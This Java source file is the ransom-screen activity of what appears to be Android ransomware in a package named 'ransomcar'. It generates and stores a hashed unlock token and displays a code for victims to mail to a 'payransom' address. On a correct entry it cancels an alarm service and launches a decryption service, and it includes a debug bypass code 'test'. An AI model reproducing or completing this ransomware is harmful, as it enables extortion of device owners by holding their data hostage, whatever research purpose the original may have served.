package com.example.ransomcar;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
//import com.example.ransomcar.R;

public class RansomMessage extends Activity {
	
	static final int READ_BLOCK_SIZE = 100;
   
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.ransom);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
		
		// Set and hash secret string to mail at payransom@
		String unlockToken = KeyGenerator.token();
		String hashUnlockToken = Hash.sha1(unlockToken);
		Log.d( "hashUnlockToken ", hashUnlockToken);
		
		// Save it to internal storage
		try {
            FileOutputStream fileout=openFileOutput("OnlyTheSecretCode.txt", MODE_PRIVATE);
            OutputStreamWriter outputWriter=new OutputStreamWriter(fileout);
            outputWriter.write(hashUnlockToken);
            outputWriter.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
		
		// Display the token on screen
		TextView text = (TextView) findViewById(R.id.secretText);
		text.setText(unlockToken);

		// Create button listener to decrypt when right key entered
		Button mButton = (Button)findViewById(R.id.unlockButton);
		mButton.setOnClickListener(
				new View.OnClickListener(){
                    public void onClick(View view){
                    	EditText mEdit = (EditText)findViewById(R.id.mailCode);	            	        
                        Log.v("Typed code", mEdit.getText().toString());
                        
                        // for debugging purposes; to be deleted
                        String test = "test";
                        
                		String hashUnlockToken = getHashUnlockToken(view);
						String typedUnlockCode = mEdit.getText().toString();
						Log.d( "hashUnlockToken ", hashUnlockToken);
						Log.d( "typedUnlockCode ", typedUnlockCode);
						
						// for debugging purposes; to be deleted
						if (test.equals(typedUnlockCode)){
						//if (hashSecretCode.equals(typedUnlockCode)){
								             	      
							// Stop the alarm service
							AlarmRepeater alarm = new AlarmRepeater();
							alarm.CancelAlarm(getBaseContext());
							Log.d( "AlarmRepeater ", "alarm cancelled");
							// Call decryption service
							Intent startDecrypt = new Intent(getBaseContext(), DecryptData.class);
							startDecrypt.putExtra("key", mEdit.getText().toString());
							startService(startDecrypt);
						}
						else
							Toast.makeText(getBaseContext(), "Wrong unlock code, try again!", Toast.LENGTH_LONG).show(); 
                  		}                       
                    }
                );
	}
	
	// Read text from file
    public String getHashUnlockToken(View view) {
        
    	String hashUnlockToken = "";
    	//reading text from file
        try {
            FileInputStream fileIn = openFileInput("OnlyTheSecretCode.txt");
            InputStreamReader InputRead = new InputStreamReader(fileIn);

            char[] inputBuffer = new char[READ_BLOCK_SIZE];
            
            int charRead;

            while ((charRead=InputRead.read(inputBuffer))>0) {
                // char to string conversion
                String readstring = String.copyValueOf(inputBuffer,0,charRead);
                hashUnlockToken += readstring;
            }
            InputRead.close();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
		return hashUnlockToken;
    }

}
